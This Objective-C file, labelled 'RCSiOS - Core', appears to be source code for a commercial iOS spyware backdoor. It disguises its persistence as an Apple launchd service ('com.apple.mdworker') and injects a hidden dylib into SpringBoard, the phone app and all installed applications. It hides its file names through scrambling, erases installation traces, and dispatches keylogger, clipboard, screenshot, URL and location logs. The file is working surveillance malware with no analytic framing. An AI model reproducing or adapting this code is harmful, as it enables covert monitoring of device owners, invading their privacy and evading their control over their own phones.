/*
 * RCSiOS - Core
 *
 * Created on 07/09/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <CommonCrypto/CommonDigest.h>
#import <unistd.h>
#import <sys/ioctl.h>
#import <fcntl.h>
#import <sys/socket.h>
#import <sys/un.h>
#import <mach/message.h>
#import <AudioToolbox/AudioToolbox.h>

#import "RCSICore.h"
#import "RCSIUtils.h"
#import "RCSICommon.h"
#import "RCSILogManager.h"
#import "RCSITaskManager.h"
#import "RCSIEncryption.h"
#import "RCSIInfoManager.h"
#import "RCSIActionManager.h"
#import "RCSIConfManager.h"
#import "RCSIAgentManager.h"

#import "NSString+ComparisonMethod.h"
#import "NSData+SHA1.h"

#import "RCSIGlobals.h"

#define RESTART_TIMEOUT 60.00

//#define DEBUG_
//#define __DEBUG_IOS_DYLIB

#pragma mark -
#pragma mark Private Interface
#pragma mark -

extern kern_return_t injectDylibToProc(pid_t pid, const char *path);
static NSMutableArray *gCurrProcsList = nil;

@interface _i_Proc : NSObject
{
  pid_t    mPid;
  BOOL     mIsInjected;
  NSString *mName;
  NSString *mPath;
}

@property (nonatomic, retain) NSString *mName;
@property (nonatomic, retain) NSString *mPath;
@property (readwrite) BOOL mIsInjected;
@property (readwrite) pid_t mPid;

+ (NSMutableArray*)processList;

- (void)dealloc;

@end

@implementation _i_Proc

@synthesize mName;
@synthesize mPath;
@synthesize mPid;
@synthesize mIsInjected;

- (id)initWithPid:(pid_t)aPid
             name:(NSString*)aName
             path:(NSString*)aPath
{
  self = [super init];
  
  if (self != nil)
  {
    if (aName != nil)
      mName = [aName retain];
    else
      mName = nil;
    
    if (aPath != nil)
      mPath = [aPath retain];
    else
      mPath = nil;
    
    mIsInjected = NO;
    
    mPid = aPid;
  }
  
  return self;
}
- (void)dealloc
{
  [mPath release];
  [mName release];
  [super dealloc];
}

+ (NSMutableArray*)processList
{
  NSMutableArray* procArray = [[NSMutableArray alloc] initWithCapacity:0];
  
  int i;
  kinfo_proc *allProcs = 0;
  size_t numProcs;

  if (getBSDProcessList (&allProcs, &numProcs))
    return procArray;
  
  for (i = 0; i < numProcs; i++)
  {
    NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
    
    pid_t _pid = allProcs[i].kp_proc.p_pid;
    
    NSString *path = pathFromProcessID(_pid);
    NSString *procName = [NSString stringWithFormat: @"%s", allProcs[i].kp_proc.p_comm];
    
    if (path != nil)
    {
      NSRange range = [path rangeOfString:@"Applications"];
      
      if (range.location != NSNotFound || [procName compare:@"SpringBoard"] == NSOrderedSame)
      {
        _i_Proc *proc = [[_i_Proc alloc] initWithPid:_pid
                                                name:procName
                                                path:path];

        [procArray addObject: proc];
        
        [proc release];
      }
    }
    
    [inner release];
  }

  free(allProcs);

  return procArray;
}

@end

@interface _i_Core (hidden)

- (void)_guessNames;

- (BOOL)makeBackdoorResident;
- (BOOL)isBackdoorAlreadyResident;
- (BOOL)shouldUpgradeComponents;
- (BOOL)amIAlone;

- (void)resetStatus:(UInt32)aStatus;
- (void)setStatus:(UInt32)aStatus;
- (BOOL)modulesAlreadyRestarting;

@end

#pragma mark -
#pragma mark Private Implementation
#pragma mark -

@implementation _i_Core (hidden)

#pragma mark -
#pragma mark Persistent routine
#pragma mark -

- (void)launchCtl:(char*)aDaemon command:(char*)aCommand
{
  char statment[256];
  
  snprintf(statment, 
           sizeof(statment), 
           "/bin/launchctl %s %s", 
           aCommand, 
           aDaemon);
  
  system(statment);
}

- (BOOL)createLaunchAgentPlist
{
  NSMutableDictionary *rootObj = [NSMutableDictionary dictionaryWithCapacity:1];
  
  NSDictionary *innerDict = 
    [[NSDictionary alloc] initWithObjectsAndKeys:
         @"com.apple.mdworker", @"Label",
         [NSNumber numberWithBool: TRUE], @"KeepAlive",
         [NSNumber numberWithInt: 3], @"ThrottleInterval",
         [[NSBundle mainBundle] bundlePath], @"WorkingDirectory",
         [NSArray arrayWithObjects: [[NSBundle mainBundle] executablePath], nil], @"ProgramArguments", 
         nil];
  
  [rootObj addEntriesFromDictionary: innerDict];
  
  [innerDict release];
  
  return [rootObj writeToFile: BACKDOOR_DAEMON_PLIST atomically: NO];
}

- (BOOL)isDaemonPlistInjected:(NSString*)pathName
{
  NSData *plistData = [[NSFileManager defaultManager] contentsAtPath: pathName];
  
  if (plistData == nil)
      return NO;
  
  NSMutableDictionary *plistDict = 
  (NSMutableDictionary *)[NSPropertyListSerialization propertyListFromData: plistData 
                                                          mutabilityOption: NSPropertyListMutableContainersAndLeaves 
                                                                    format: nil  
                                                          errorDescription: nil];
  
  if (plistDict == nil)
    return NO;
  
  NSMutableDictionary *plistEnvDict = (NSMutableDictionary *)[plistDict objectForKey: @"EnvironmentVariables"];
  
  if (plistEnvDict == nil) 
    {
      return FALSE;
    }
  else 
    {
      NSString *envObjIn  = (NSString *) [plistEnvDict objectForKey: @"DYLD_INSERT_LIBRARIES"];
      
      if (envObjIn == nil) 
        {
          return FALSE;
        }
      else 
        {
          NSRange sbRange;
          sbRange = [envObjIn rangeOfString: gDylibName options: NSCaseInsensitiveSearch]; 
        
          if (sbRange.location == NSNotFound)
            return FALSE;
          else
            return TRUE;
        }
    }
}

- (BOOL)makeBackdoorResident
{   
  if ([self isDaemonPlistInjected: SB_PATHNAME] == TRUE)
    return TRUE;
  
  // Dylib injection
  if (injectDylib(SB_PATHNAME) == YES)
    {
      [self launchCtl: SPRINGBOARD_PLIST_PATH command: "unload"];
      usleep(500000);
      [self launchCtl: SPRINGBOARD_PLIST_PATH command: "load"];
    }
  
  if (injectDylib(IT_PATHNAME) == YES) 
    {
      [self launchCtl: ITUNESSTORE_PLIST_PATH command: "unload"];
      usleep(500000);
      [self launchCtl: ITUNESSTORE_PLIST_PATH command: "load"];
    }
  
  return TRUE;
}

- (BOOL)createExternalLib
{
  NSString *dylibPathname =
  [[NSString alloc] initWithFormat:@"%@/%@",
                                   @"/usr/lib",
                                   gDylibName];
  NSString *local_dylibName =
  [[NSString alloc] initWithFormat:@"%@/%@",
                                   [[NSBundle mainBundle] bundlePath],
                                   gDylibName];
  
  if ([[NSFileManager defaultManager] fileExistsAtPath:dylibPathname] == FALSE)
  {
    if ([[NSFileManager defaultManager] copyItemAtPath:local_dylibName
                                                toPath:dylibPathname
                                                 error:nil] == FALSE);
    return FALSE;
  }
  
  return TRUE;
}

- (BOOL)isBackdoorAlreadyResident
{
  if ([self createExternalLib] == FALSE)
  {
    createInfoLog(@"Cannot install external module");
  }
  
  if ([[NSFileManager defaultManager] fileExistsAtPath:BACKDOOR_DAEMON_PLIST
                                           isDirectory:NULL])
    return YES;
  else
    return NO;
}

- (BOOL)updateDylibConfigId
{
  _i_DylibBlob *tmpBlob = [[_i_DylibBlob alloc] initWithType:DYLIB_NEW_CONFID 
                                                        status:1 
                                                    attributes:0 
                                                          blob:nil
                                                      configId:[[_i_ConfManager sharedInstance] mConfigTimestamp]];
  
  [[_i_SharedMemory sharedInstance] writeIpcBlob: [tmpBlob blob]];
  
  [tmpBlob release];
  
  return TRUE;
}

#pragma mark -
#pragma mark Uninstall
#pragma mark -

- (BOOL)uninstallExternalModules
{  
  NSData *dylibName = [gDylibName dataUsingEncoding:NSUTF8StringEncoding];
  
  _i_DylibBlob *tmpBlob = [[_i_DylibBlob alloc] initWithType:DYLIB_NEED_UNINSTALL 
                                                        status:1 
                                                    attributes:0 
                                                          blob:dylibName
                                                      configId:0];
  
  [[_i_SharedMemory sharedInstance] writeIpcBlob: [tmpBlob blob]];
  
  [tmpBlob release];
  
  return TRUE;
}

- (void)uninstallMeh
{
  int kpfdylib   = 0x0066706b;
  int kpbdylib   = 0x0062706b;
  NSString *boot = @"bootpd";
  NSString *comp = @"com.apple";
  
  NSString *kpfname    = [NSString stringWithFormat:@"/usr/lib/%s.dylib", (char*)&kpfdylib];
  NSString *kpbname    = [NSString stringWithFormat:@"/usr/lib/%s.dylib", (char*)&kpbdylib];
  NSString *bootplist  = [NSString stringWithFormat:@"/System/Library/LaunchDaemons/%@.%@.plist",
                                                   comp, boot];
  
  NSString *lockdown_saved  = [NSString stringWithFormat:@"/System/Library/Lockdown/Services.bck"];
  NSString *lockdown_plist  = [NSString stringWithFormat:@"/System/Library/Lockdown/Services.plist"];
  
  if ([[NSFileManager defaultManager] fileExistsAtPath:lockdown_saved])
  {
    [[NSFileManager defaultManager] removeItemAtPath:lockdown_plist error:nil];
    
    [[NSFileManager defaultManager] copyItemAtPath:lockdown_saved
                                            toPath:lockdown_plist
                                             error:nil];
  }
  
  [[NSFileManager defaultManager] removeItemAtPath:kpfname    error:nil];
  [[NSFileManager defaultManager] removeItemAtPath:kpbname    error:nil];
  [[NSFileManager defaultManager] removeItemAtPath:bootplist  error:nil];
  
  NSString *sbPathname = @"/System/Library/LaunchDaemons/com.apple.SpringBoard.plist";
  NSString *itPathname = @"/System/Library/LaunchDaemons/com.apple.itunesstored.plist";
  NSString *dylibPathname = 
          [[NSString alloc] initWithFormat: @"%@/%@", @"/usr/lib", gDylibName];
  
  [self uninstallExternalModules];
  
  removeDylibFromPlist(sbPathname);
  removeDylibFromPlist(itPathname);
  
  [self launchCtl: ITUNESSTORE_PLIST_PATH command: "unload"];
  [self launchCtl: ITUNESSTORE_PLIST_PATH command: "load"];
    
  [[NSFileManager defaultManager] removeItemAtPath: dylibPathname
                                             error: nil];
  [[NSFileManager defaultManager] removeItemAtPath: [[NSBundle mainBundle] bundlePath]
                                             error: nil];
  
  if (mLockSock != -1)
    close(mLockSock);
    
  [[NSFileManager defaultManager] removeItemAtPath: BACKDOOR_DAEMON_PLIST
                                             error: nil];
    
  checkAndRunDemoMode();
  
  sleep(1);
  
  [self launchCtl: "com.apple.mdworker" command: "remove"];
  
  [dylibPathname release];
  
  exit(0);
}

- (BOOL)shouldUpgradeComponents
{
  NSString *migrationConfig = [[NSString alloc] initWithFormat: @"%@/%@",
                               [[NSBundle mainBundle] bundlePath],
                               RCS8_MIGRATION_CONFIG];
  
  if ([[NSFileManager defaultManager] fileExistsAtPath: migrationConfig] == TRUE)
    {  
      NSString *configurationPath = [[NSString alloc] initWithFormat: @"%@/%@",
                                     [[NSBundle mainBundle] bundlePath],
                                     gConfigurationName];
      
      if ([[NSFileManager defaultManager] removeItemAtPath: configurationPath
                                                     error: nil])
        { // FIXED- corregere su mac!!!!!! XXX-
          [[NSFileManager defaultManager] moveItemAtPath: migrationConfig
                                                  toPath: configurationPath
                                                   error: nil];
        }
      
      [configurationPath release];
    }
  
  [migrationConfig release];
  
  NSString *updateDylib = [[NSString alloc] initWithFormat: @"%@/%@",
                           [[NSBundle mainBundle] bundlePath],
                           RCS8_UPDATE_DYLIB];
  
  if ([[NSFileManager defaultManager] fileExistsAtPath: updateDylib] == TRUE)
    
    {
      NSString *dylib = [[NSString alloc] initWithFormat: @"/usr/lib/%@", gDylibName];
    
      [[NSFileManager defaultManager] removeItemAtPath: dylib
                                                 error: nil];
    
      [[NSFileManager defaultManager] moveItemAtPath: updateDylib
                                              toPath: dylib
                                               error: nil];
      [dylib release];                                   
    
      // Forcing a SpringBoard reload
      [self launchCtl:SPRINGBOARD_PLIST_PATH command:"unload"];
      usleep(500000);
      [self launchCtl:SPRINGBOARD_PLIST_PATH command:"load"];
    }
  
  [updateDylib release];
  
  return TRUE;
}

#pragma mark -
#pragma mark Startup support routine
#pragma mark -

- (BOOL)amIAlone
{
  // Lock to prevent more instance of running backdoor
  if ((mLockSock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) != -1) 
    {
      struct sockaddr_in l_addr;   
      
      memset(&l_addr, 0, sizeof(l_addr));
      l_addr.sin_family       = AF_INET;
      l_addr.sin_port         = htons(37173);
      l_addr.sin_addr.s_addr  = inet_addr("127.0.0.1");
      
      if ((bind(mLockSock, (struct sockaddr *)&l_addr, sizeof(l_addr)) == -1) && 
          errno == EADDRINUSE) 
        {
          return NO;
        }
    }
  
  return YES;
}

- (NSString*)_guessIIDnames:(_i_Encryption*)_encryption
{
  NSString* _iidName = nil;
  NSString* _iidNameUpdate = nil;
  
  _iidName       = [_encryption scrambleForward: gBackdoorName
                                           seed: 10];
  _iidNameUpdate = [_encryption scrambleForward: gBackdoorUpdateName
                                           seed: 10];
  
  if ([[NSFileManager defaultManager] fileExistsAtPath:_iidName] == TRUE)
    return _iidName;
  else
    return _iidNameUpdate;
}

- (void)_guessNames
{
  NSData *temp = [NSData dataWithBytes: gConfAesKey
                                length: CC_MD5_DIGEST_LENGTH];
  
  _i_Encryption *_encryption = [[_i_Encryption alloc] initWithKey: temp];
  
  gBackdoorName = [[[NSBundle mainBundle] executablePath] lastPathComponent];
  
  gBackdoorUpdateName = [_encryption scrambleForward: gBackdoorName
                                                seed: ALPHABET_LEN / 2];
  
  if ([gBackdoorName isLessThan: gBackdoorUpdateName])
    {
      gConfigurationName = [_encryption scrambleForward: gBackdoorName 
                                                   seed: 1];
    }
  else
    {
      gConfigurationName = [_encryption scrambleForward: gBackdoorUpdateName 
                                                   seed: 1];
    }
  
  gConfigurationUpdateName = [_encryption scrambleForward: gConfigurationName  
                                                     seed: ALPHABET_LEN / 2];
  
  gDylibName = [_encryption scrambleForward: gConfigurationName 
                                       seed: 2];
  
  gCurrInstanceIDFileName = [self _guessIIDnames:_encryption];
}

#pragma mark -
#pragma mark Message handling
#pragma mark -

typedef struct _coreMessage_t
{
  mach_msg_header_t header;
  uint dataLen;
} coreMessage_t;

- (void)refreshRemoteBlobs:(NSData*)aMessage
{
  shMemoryLog *message = (shMemoryLog *)[aMessage bytes];
  [[_i_SharedMemory sharedInstance] refreshRemoteBlobsToPid: message->flag];
}

- (void)dispatchToLogManager:(NSData*)aMessage
{
  if (aMessage != nil) 
    {
      mach_port_t machPort = 
          [[[_i_LogManager sharedInstance] notificationPort] machPort];
      [_i_SharedMemory sendMessageToMachPort:machPort withData:aMessage];
    }
}

- (void)dispatchToEventManager:(NSData*)aMessage
{
  if (aMessage != nil) 
    {
      mach_port_t machPort = [[eventManager notificationPort] machPort];
      [_i_SharedMemory sendMessageToMachPort:machPort withData:aMessage];
    }
}

- (void)dispatchToActionManager:(NSData*)aMessage
{
  if (aMessage != nil) 
    {
      mach_port_t machPort = [[actionManager notificationPort] machPort];
      [_i_SharedMemory sendMessageToMachPort:machPort withData:aMessage];
    }
}

- (void)dispatchToAgentManager:(NSData*)aMessage
{
  if (aMessage != nil) 
    {
      mach_port_t machPort = [[agentManager notificationPort] machPort];
      [_i_SharedMemory sendMessageToMachPort:machPort withData:aMessage];
    }
}

- (void)broadcastUninstall
{
  shMemoryLog reload;
  reload.agentID  = CORE_NOTIFICATION;
  reload.flag     = CORE_NEED_STOP;
  
  NSData *msgData = [[NSData alloc] initWithBytes: &reload 
                                           length:sizeof(shMemoryLog)];
  [self dispatchToEventManager:  msgData];
  [self dispatchToActionManager: msgData];
  [self dispatchToAgentManager:  msgData];
  
  [msgData release];
}

/*
 * Check if backdoor is blocked on restarting mouduels
 */
- (void)checkWDTimeout:(NSTimer*)theTimer
{
  if (mIsRestarting == TRUE)
  {
    /*
     * timeout reached: exit immediatly and unclean
     */
    createInfoLog(@"Reload timeout reached");
    
    sleep(1);
    
    exit(-1);
  }
}

- (void)manageCoreNotification:(uint)aFlag
                   withMessage:(NSData*)aMessage
{
  if (aFlag == CORE_NEED_RESTART && 
      [self modulesAlreadyRestarting] == FALSE)
    {
      [self dispatchToEventManager:  aMessage];
      [self dispatchToActionManager: aMessage];
      [self dispatchToAgentManager:  aMessage];
    
      [self updateDylibConfigId];
    
      [self setStatus: CORE_STATUS_RELOAD];
      
      /*
       * Start the watchdog: max RESTART_TIMEOUT
       */
      mIsRestarting = TRUE;
      
      [NSTimer scheduledTimerWithTimeInterval:RESTART_TIMEOUT
                                       target:self
                                     selector:@selector(checkWDTimeout:)
                                     userInfo:nil
                                      repeats:NO];
    }
  else if (aFlag == CORE_ACTION_STOPPED)
    {
      [self resetStatus: CORE_STATUS_AM_RUN];
    }
  else if (aFlag == CORE_EVENT_STOPPED)
    {
      [self resetStatus: CORE_STATUS_EM_RUN];
    }
  else if (aFlag == CORE_AGENT_STOPPED)
    {
      [self resetStatus: CORE_STATUS_MM_RUN];
    }
  else if (aFlag == ACTION_DO_UNINSTALL)
    {
      [self setStatus: CORE_STATUS_STOPPING];
      [self broadcastUninstall];
    }
}

- (void)dispatchMessages:(NSData*)aMessage
{
  if (aMessage == nil)
    return;
    
  shMemoryLog *message = (shMemoryLog *)[aMessage bytes];
  
  switch (message->agentID)
  {
    case EVENT_SIM_CHANGE:
    case EVENT_TRIGGER_ACTION:
    {
      if ([self modulesAlreadyRestarting] == FALSE)
        [self dispatchToActionManager: aMessage];
      break;
    }
    case ACTION_START_AGENT:
    case ACTION_STOP_AGENT:
    {
      if ([self modulesAlreadyRestarting] == FALSE)
        [self dispatchToAgentManager: aMessage];
      break;
    }
    case ACTION_EVENT_ENABLED:
    case ACTION_EVENT_DISABLED:
    case EVENT_STANDBY:
    case EVENT_CAMERA_APP:
    {
      if ([self modulesAlreadyRestarting] == FALSE)
        [self dispatchToEventManager: aMessage];
      break;
    }
    case LOG_URL:
    case LOG_APPLICATION:
    case LOG_CLIPBOARD:
    case LOG_KEYLOG:
    case LOG_SNAPSHOT:
    case LOGTYPE_LOCATION_NEW:
    {
      [self dispatchToLogManager:aMessage];
      break;
    }
    case CORE_NOTIFICATION:
    {
      [self manageCoreNotification:message->flag 
                       withMessage:aMessage];
      break;
    }
    case DYLIB_CONF_REFRESH:
    {
      [self refreshRemoteBlobs:aMessage];
      break;
    }
  }
}

- (int)processIncomingMessages
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSMutableArray *messages = [[_i_SharedMemory sharedInstance] fetchMessages];
  
  int msgCount = [messages count];
  
  for (int i=0; i < msgCount; i++) 
    [self dispatchMessages: [messages objectAtIndex:i]];
  
  [pool release];
  
  return msgCount;
}

#pragma mark -
#pragma mark Modules management
#pragma mark -

- (void)setStatus:(UInt32)aStatus
{
  moduleStatus |= aStatus;
}

- (void)resetStatus:(UInt32)aStatus
{
  moduleStatus &= ~(aStatus);
}

- (BOOL)modulesAlreadyRestarting
{
  if (!(moduleStatus & CORE_STATUS_STOPPING) && 
      ((moduleStatus & CORE_STATUS_RELOAD) == 0))
    return FALSE;
  else
    return TRUE;
}

- (BOOL)startEventManager
{
  [eventManager release];
  
  eventManager = [[_i_EventManager alloc] init];

  if ([eventManager start] == TRUE)
    {
      [self setStatus: CORE_STATUS_EM_RUN];
      return TRUE;
    }
  else 
    return FALSE;
}

- (BOOL)startActionManager
{
  [actionManager release];
  
  actionManager = [[_i_ActionManager alloc] init];
  
  if ([actionManager start] == TRUE)
    {  
      [self setStatus: CORE_STATUS_AM_RUN];
      return TRUE;
    }
  else
    return FALSE;
}

- (BOOL)startAgentManager
{
  [agentManager release];
  
  agentManager = [[_i_AgentManager alloc] init];
  
  if ([agentManager start] == TRUE)
    {  
      [self setStatus: CORE_STATUS_MM_RUN];
      return TRUE;
    }
  else
    return FALSE;
}

- (BOOL)shouldRestartModules
{
  BOOL retVal = FALSE;
  
  if ((moduleStatus  & CORE_STATUS_RELOAD) &&
      ((moduleStatus & CORE_STATUS_MDLS_BITS) == CORE_STATUS_MDLS_ALL_STOPPED))
    retVal = TRUE;
  
  return retVal;
}

- (BOOL)shouldStopCore
{
  BOOL retVal = FALSE;
  
  if ((moduleStatus  & CORE_STATUS_STOPPING) &&
      ((moduleStatus & CORE_STATUS_MDLS_BITS) == CORE_STATUS_MDLS_ALL_STOPPED))
    retVal = TRUE;
  
  return retVal;
}

#pragma mark -
#pragma mark Process Injection
#pragma mark -

- (void)setInjectedFlag:(_i_Proc*)theProc
{
  for (int i=0; i < [gCurrProcsList count]; i++)
  {
    _i_Proc *oldProc = [gCurrProcsList objectAtIndex:i];
    
    if (([oldProc mPid] == [theProc mPid]) &&
        ([[oldProc mName] compare:[theProc mName]] == NSOrderedSame))
    {
      [theProc setMIsInjected:YES];
    }
  }
}

- (void)updateProcList
{
  NSMutableArray *newProcs = [_i_Proc processList];
  
  for (int i=0; i < [newProcs count]; i++)
  {
    _i_Proc *tmpProc = [newProcs objectAtIndex:i];
    
    [self setInjectedFlag: tmpProc];
  }
  
  [gCurrProcsList release];
  gCurrProcsList = newProcs;
}

- (void)injectProcesses:(NSTimer*)theTimer
{
  char dylibname[256];
  char dylbPathname[256];
  
  [self updateProcList];
  
  [gDylibName getCString: dylibname maxLength: 256 encoding:NSUTF8StringEncoding];
  snprintf(dylbPathname, sizeof(dylbPathname), "/usr/lib/%s", dylibname);
  
  for (int i=0; i<[gCurrProcsList count]; i++)
  {
    _i_Proc *proc = [gCurrProcsList objectAtIndex:i];
    
    if ([proc mIsInjected] == NO)
    {
      injectDylibToProc([proc mPid], dylbPathname);
    }
  }
}

- (BOOL)checkAndinjectSB
{
  BOOL bRet = TRUE;
  char dylibname[256];
  char dylbPathname[256];
  
  if ([self isDaemonPlistInjected: SB_PATHNAME] == TRUE)
    return TRUE;
  
  pid_t sb_pid = getPidByProcessName(@"SpringBoard");
  pid_t mp_pid = getPidByProcessName(@"MobilePhone");
  
  if (sb_pid > 0 &&  sb_pid != mSBPid)
  {
    mSBPid = sb_pid;
    
    [gDylibName getCString: dylibname maxLength: 256 encoding:NSUTF8StringEncoding];
    snprintf(dylbPathname, sizeof(dylbPathname), "/usr/lib/%s", dylibname);
    
    if (injectDylibToProc(mSBPid, dylbPathname) == 0)
      bRet = TRUE;
    else
      bRet = FALSE;
    
    injectDylibToProc(mp_pid, dylbPathname);
  }
  
  return bRet;
}

/*
 * invoked by timer
 */
- (void)checkAndinjectSB:(NSTimer*)theTimer
{
  [self checkAndinjectSB];
}

- (void)startInjection
{
#ifdef __DEBUG_IOS_DYLIB
  return;
#endif
  
  if (gOSMajor >= 6)
  {
    NSTimer *timer = [NSTimer scheduledTimerWithTimeInterval: 1.0
                                                     target: self
                                                   selector: @selector(injectProcesses:)
                                                    userInfo: nil
                                                    repeats: YES];
    
    [[NSRunLoop currentRunLoop] addTimer: timer forMode: NSRunLoopCommonModes];
  }
  else
    if ([self checkAndinjectSB] == TRUE)
    {
      NSTimer *timer = [NSTimer scheduledTimerWithTimeInterval: 10.0
                                                        target: self 
                                                      selector: @selector(checkAndinjectSB:) 
                                                      userInfo: nil
                                                       repeats: YES];
      
      [[NSRunLoop currentRunLoop] addTimer: timer forMode: NSRunLoopCommonModes];
    }
    else
    {
      [self makeBackdoorResident];
    }
}

#pragma mark -
#pragma mark Main runloop
#pragma mark -

- (void)coreRunLoop
{ 
  // singleton object with the correct names of files
  _i_ConfManager *configManager = [[_i_ConfManager alloc] initWithBackdoorName:
                                    [[[NSBundle mainBundle] executablePath] lastPathComponent]];
  
  if ([configManager checkConfiguration] == NO)
    exit(-1);
  
  // sound/vibrate in demo mode
  checkAndRunDemoMode();
  
  _i_LogManager  *logManager = [_i_LogManager sharedInstance];
  [logManager start];
  
  createInfoLog(@"Start");
  
  [self startInjection];
  
  /*
   * enable main runloop for battery notification
   */
  [[UIDevice currentDevice] setBatteryMonitoringEnabled:YES];
  
  while ([self mMainLoopControlFlag] != CORE_STOPPED)
    {
      NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
          
      [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow: 0.750]]; 

      [self processIncomingMessages];
    
      // first run and every new conf received
      if ([self shouldRestartModules] == TRUE)
        {
          [[_i_SharedMemory sharedInstance] delBlobs];
        
          if ([self startAgentManager]  == TRUE &&
              [self startActionManager] == TRUE && 
              [self startEventManager]  == TRUE)
            {
              // reset flag checked by watchdog timer
              mIsRestarting = FALSE;
              [self resetStatus: CORE_STATUS_RELOAD];
            }
          else
            {
              exit(-1);
            }
        }
      else if ([self shouldStopCore] == TRUE)
        {
          // all modules flags are resetted
          //    -> modulesStatus = CORE_STOPPING_STAT
          [self setMMainLoopControlFlag: CORE_STOPPED];
        }
    
      [pool release];
    }
  
  // clean all and exit
  [self uninstallMeh];
}

@end

#pragma mark -
#pragma mark Public Implementation
#pragma mark -

@implementation _i_Core

@synthesize mMainLoopControlFlag;
@synthesize mSBPid;

- (id)init
{
  self = [super init];
  
  if (self != nil)
    {
      mMainLoopControlFlag  = CORE_RUNNING;
      moduleStatus          = CORE_STATUS_RELOAD;
      eventManager          = nil;
      actionManager         = nil;
      agentManager          = nil;
      mLockSock             = -1;
      mSBPid                = -1;
      mIsRestarting         = FALSE;
      
      [self _guessNames];
    }
  
  return self;
}

- (void)dealloc
{
  [super dealloc];
}

- (void)cleanUp:(NSTimer*)theTimer
{
  int zeroChar = 0;
  
  NSString *kdifolder = [NSString stringWithFormat:@"/var/mobile/Media/%c%c%c",
                              'k', 'd', 'i'];
  NSString *iosfolder = [NSString stringWithFormat:@"/var/mobile/Media/%c%c%c",
                              'i', 'o', 's'];
  
  [[NSFileManager defaultManager] removeItemAtPath:kdifolder error:nil];
  [[NSFileManager defaultManager] removeItemAtPath:iosfolder error:nil];
  
  NSString *installDirName = [NSString stringWithFormat:@"../.%d%d%d%d",
                                                        zeroChar, zeroChar, zeroChar, zeroChar];
  
  NSString *installLaunchName = [NSString stringWithUTF8String: LAUNCHD_INSTALL_PLIST];
  
  [[NSFileManager defaultManager] removeItemAtPath:installDirName error:nil];

  [[NSFileManager defaultManager] removeItemAtPath:installLaunchName error:nil];
}

- (BOOL)runMeh
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  if ([self amIAlone] == NO)
    {
      [pool release];
      exit(-1);
    } 
    
  getSystemVersion(&gOSMajor, &gOSMinor, &gOSBugFix);

  [self shouldUpgradeComponents];

  [[_i_SharedMemory sharedInstance] createCoreRLSource];
  
  if ([self isBackdoorAlreadyResident] == FALSE)
      [self createLaunchAgentPlist];

  /*
   * clean up some installation junks from USB tool
   */
  [NSTimer scheduledTimerWithTimeInterval:45.00
                                   target:self
                                 selector:@selector(cleanUp:)
                                 userInfo:nil
                                  repeats:NO];
  
  [self coreRunLoop];
  
  [pool release];
  
  return YES;
}

@end


